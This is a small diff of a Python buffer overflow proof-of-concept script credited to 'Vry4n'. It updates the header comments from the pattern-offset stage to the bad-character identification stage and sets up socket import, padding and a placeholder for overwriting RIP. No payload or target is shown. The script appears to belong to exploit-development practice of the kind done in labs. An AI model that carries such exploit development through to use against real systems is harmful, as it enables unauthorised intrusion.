@@ -1,8 +1,8 @@
 #!/usr/bin/python
 import socket
 
-# Part 3 of proof of concept by Vry4n
-# This script is intended send a pattern created with Metasploit pattern_create.rb script
+# Part 5 of proof of concept by Vry4n
+# This script is intended to send and identify badchars
 
 FUZZ = 'A' * 120
 RIP = "B" * 4
